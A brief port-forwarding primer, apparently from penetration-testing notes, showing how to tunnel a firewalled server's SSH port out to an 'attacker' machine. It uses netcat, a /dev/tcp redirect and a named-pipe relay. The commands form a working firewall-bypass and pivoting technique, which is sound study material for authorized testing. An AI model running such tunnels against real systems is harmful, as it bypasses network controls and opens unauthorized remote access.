---
description: Using SSH to access local processes or access local internal network machines
---

# Port Forwarding Primer

## Using netcat&#x20;

On server behind (incoming) firewall:

```bash
nc localhost 22 >& /dev/tcp/<your-hostname>/<open port on local computer, i.e. 9000> 0>&1
```

On local/attacker computer/shell:

```bash
cd /tmp; mkfifo backpipe
nc -l 9000 0<backpipe | nc -l 9001 | tee backpipe
```

On local computer, separate terminal/shell session:

```bash
ssh localhost -p 9001
```
